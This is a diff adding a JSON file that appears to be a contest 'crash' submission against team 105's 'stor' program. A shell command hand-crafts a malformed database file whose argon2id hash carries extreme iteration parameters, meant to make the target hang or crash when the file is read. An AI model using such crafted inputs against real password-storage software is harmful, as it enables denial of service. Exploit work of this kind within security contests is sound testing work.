@@ -1,0 +1,14 @@
+{
+  "target_team": 105,
+  "type": "crash",
+  "commands": [
+    {
+      "program": "sh",
+      "args": [
+        "-c",
+        "{ printf 'STORDB01'; printf '\\001\\000\\000\\000'; printf '\\005\\000\\000\\000alice'; dd if=/dev/zero bs=1 count=16 2>/dev/null; printf '\\146\\000\\000\\000'; V='$argon2id$v=19$m=8,t=1000000000,p=1$REUAfPJaWbz4yaZVEdBImQ$lKszAKpwgc3XLU/m2TFZhcpEW6czrnNPIRl4KLHZspo'; printf '%s' \"$V\"; printf '\\000\\000\\000\\000'; } > enc.db"
+      ]
+    },
+    {"program": "stor", "args": ["-u", "alice", "-k", "k", "-f", "x", "read"]}
+  ]
+}
